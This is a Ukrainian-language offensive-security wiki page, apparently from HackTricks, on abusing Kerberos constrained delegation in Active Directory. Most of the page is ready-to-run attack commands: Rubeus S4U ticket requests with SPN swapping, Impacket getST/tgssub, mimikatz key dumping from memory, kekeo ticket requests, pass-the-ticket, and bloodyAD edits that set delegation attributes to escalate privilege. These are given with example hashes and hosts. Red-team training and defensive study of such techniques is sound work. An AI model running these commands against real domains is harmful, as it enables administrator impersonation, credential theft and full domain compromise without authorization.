# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

За допомогою цього Domain admin може **дозволити** комп'ютеру **імперсонувати користувача або комп'ютер** щодо будь-якого **service** машини.

- **Service for User to self (_S4U2self_):** Будь-який **service account, що володіє SPN**, зазвичай може отримати TGS для себе від імені довільного користувача. Якщо цей account також має [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) у _userAccountControl_, цей TGS є **forwardable**, що робить protocol transition безпосередньо корисним для **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **service account** може отримати TGS від імені користувача до SPN, перелічених у **msDS-AllowedToDelegateTo**. Evidence ticket, що використовується в S4U2Proxy, має бути **forwardable** ticket до delegating service: або справжній client-to-service ticket, захоплений у victim, або ticket, створений за допомогою **S4U2Self + T2A4D**.

**Note**: Якщо користувач позначений в AD як ‘_Account is sensitive and cannot be delegated_’ або є членом **Protected Users**, ви зазвичай **не зможете імперсонувати** його через constrained delegation. У сучасних доменах під час атак на delegation-enabled accounts надавайте перевагу **AES** material, а не припущенням, що доступний лише RC4.

Це означає, що якщо ви **скомпрометуєте hash service**, ви зможете **імперсонувати користувачів** і отримати **access** від їхнього імені до будь-якого **service** на вказаних машинах (можливий **privesc**).

Крім того, ви **матимете access не лише до service, який користувач може імперсонувати, а й до будь-якого service**, оскільки SPN (ім'я service, що запитується) не перевіряється (у ticket ця частина не зашифрована/не підписана). Тому, якщо ви маєте доступ до **CIFS service**, ви також можете отримати доступ до **HOST service**, використовуючи, наприклад, прапорець `/altservice` у Rubeus. Ця сама слабкість із підміною SPN використовується в **Impacket getST -altservice** та інших інструментах.

Також доступ до **LDAP service на DC** потрібен для експлуатації **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Примітка для оператора:** не покладайтеся лише на скриншоти **ADUC** або BloodHound під час перевірки **gMSA/sMSA**. У цих облікових записів часто відсутня стандартна вкладка Delegation, тому безпосередньо перераховуйте атрибути **`userAccountControl`** і **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

Якщо скомпрометований акаунт має **T2A4D**, зазвичай можна повністю виконати ланцюжок **`S4U2Self -> S4U2Proxy`**, використовуючи лише service key/TGT.<sup>[[2]](#references)</sup>

Якщо він має лише **`msDS-AllowedToDelegateTo`** (класичний режим **"Use Kerberos only"**), delegation усе ще може бути abusable, але evidence ticket для S4U2Proxy має бути **реальним forwardable user-to-service ticket** для delegating service. На практиці це означає викрасти або перехопити victim TGS з **LSASS/ccache** і передати його на другий етап (`/tgs:` у Rubeus). **Non-forwardable** S4U2Self ticket **недостатній** для classic constrained delegation; якщо це ваш єдиний evidence ticket, перевірте [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Нотатки щодо cross-domain constrained delegation (2025+)

Починаючи з **Windows Server 2012/2012 R2**, KDC підтримує **constrained delegation між domains/forests** через розширення S4U2Proxy. Сучасні builds (Windows Server 2016–2025) зберігають цю поведінку та додають два PAC SIDs для позначення protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**), коли user автентифікувався звичайним способом.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**), коли service підтвердив identity через protocol transition.

Очікуйте `SERVICE_ASSERTED_IDENTITY` всередині PAC, коли protocol transition використовується між domains, що підтверджує успішне виконання кроку S4U2Proxy.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket (0.11.x+) надає той самий S4U chain і SPN swapping, що й Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Якщо ви надаєте перевагу спочатку forging user ST (наприклад, маючи лише offline hash), використовуйте **ticketer.py** разом із **getST.py** для S4U2Proxy. **tgssub.py** також стане у пригоді, якщо у вас уже є робочий ccache і потрібно лише замінити service class для того самого хоста. Дивіться відкриту проблему Impacket #1713 щодо актуальних особливостей (KRB_AP_ERR_MODIFIED, коли forged ST не відповідає ключу SPN).<sup>[[2]](#references)</sup>

### Автоматизація налаштування delegation із low-priv creds

Якщо ви вже маєте **GenericAll/WriteDACL** для computer або service account, можна віддалено встановити необхідні attributes без RSAT за допомогою **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Це дає змогу побудувати шлях constrained delegation для privesc без привілеїв DA, щойно ви зможете записувати ці атрибути.

- Step 1: **Отримайте TGT дозволеного service**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Існують **інші способи отримати TGT ticket** або **RC4** чи **AES256**, не маючи прав SYSTEM на комп’ютері, наприклад Printer Bug, unconstrain delegation, NTLM relaying і Active Directory Certificate Service abuse
>
> **Маючи лише цей TGT ticket (або його hash), ви можете виконати цю атаку, не отримуючи повний контроль над комп’ютером.**

- Step2: **Отримати TGS для сервісу, видаючи себе за користувача**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Більше інформації на ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) та [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## Посилання

- [1] [Огляд Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Зловживання Delegation за допомогою Impacket (частина 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: огляд наступального використання Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

{{#include ../../banners/hacktricks-training.md}}
